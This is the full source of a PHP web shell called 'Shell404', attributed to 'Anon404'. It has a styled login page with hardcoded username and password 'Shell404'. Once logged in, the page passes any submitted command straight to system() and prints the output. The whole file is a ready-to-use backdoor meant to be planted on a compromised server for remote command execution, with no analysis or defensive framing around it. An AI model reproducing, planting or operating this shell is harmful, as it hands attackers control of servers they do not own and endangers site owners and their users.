<?php

	session_start();
	
    $user = "Shell404";
    $pass = "Shell404";
    $username = NULL;
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Shell404</title>

    <style>
        html {
            background-color: black;
            color: lime;
            margin-top : 8% ;
            text-align: center;
        }
        h1 {
            margin: 7px 0 0 2px;
            text-shadow: 0px 0px 10px green;
            text-align: center;
        }
        #des {
            color: red;
            margin: 3px;
            text-shadow: 0px 0px 10px red;
            margin-bottom: 30%;
        }
        #input {
            text-align: center;
            width: 62%;
            height: 33px;
            border: 3px solid lime;
            border-radius: 8px;
            margin-top: 1%;
            box-shadow: 0px 0px 20px green;
            background-color: transparent;
            color: lime;
        }
        #submit {
            width: 40%;
            height: 30px;
            border: 3px solid red;
            border-radius: 8px;
            margin-top: 7%;
            box-shadow: 0px 0px 20px red;
            background-color: transparent;
            color: lime;
            text-shadow: 0px 0px 10px red;
        }
    </style>
</head>
<body>

    <?php

    function shellfunc() {
        echo '
        <style>
            html {
                text-align: left;
                margin-top: 2%;
            }
            #input {
                text-align: left;
                width: 50%;
                height: 33px;
                border: 3px solid lime;
                border-radius: 8px;
                margin-top: 1%;
                box-shadow: 0px 0px 20px green;
                background-color: transparent;
                color: lime;
            }
            #des, h1 {
                text-align: center;
            }
            #Run {
                text-align: center;
                width: 20%;
                height: 40px;
                border: 3px solid lime;
                border-radius: 8px;
                margin-top: 1%;
                box-shadow: 0px 0px 20px green;
                background-color: red;
                color: lime;
            }
            
        </style>

        <h1>Shell404</h1>
        <h4 id="des">Shell404 PHP web shell by Anon404</h4>

        <form method="POST">
            <input required id="input" type="text" name="cmd" placeholder="Command...">
            <input id="Run" type="submit" value="Run">
        </form>
        ';

        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            echo '<pre>';
            system($cmd);
            echo '</pre>';
        }
    }

/*

    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        if ($user === $username && $pass === $password) {
            shellfunc();
        } else {
            echo '<h3 style="color: red">Incorrect username or password</h3>';
            showLoginForm(); // Show the login form again
        }
    } else {
        showLoginForm(); // Initial login form display
    }

*/

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($user === $username && $pass === $password) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Incorrect username or password";
    }
}

if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    shellfunc();
} else {
    showLoginForm(isset($error) ? $error : '');
}

function showLoginForm($error = '') {
    echo '
    <h1>Shell404</h1>
    <h4 id="des">Shell404 PHP web shell by Anon404</h4>

    <form method="POST">
        <input required id="input" type="text" name="username" placeholder="Enter Username">
        <br>
        <input required id="input" type="password" name="password" placeholder="Enter Password">
        <br>
        <input id="submit" type="submit" value="Login">
    </form>
    ';

    if ($error) {
        echo '<h3 style="color: red; text-shadow: 0px 0px 10px red;">' . $error . '</h3>';
    }
}
    ?>

</body>
</html>
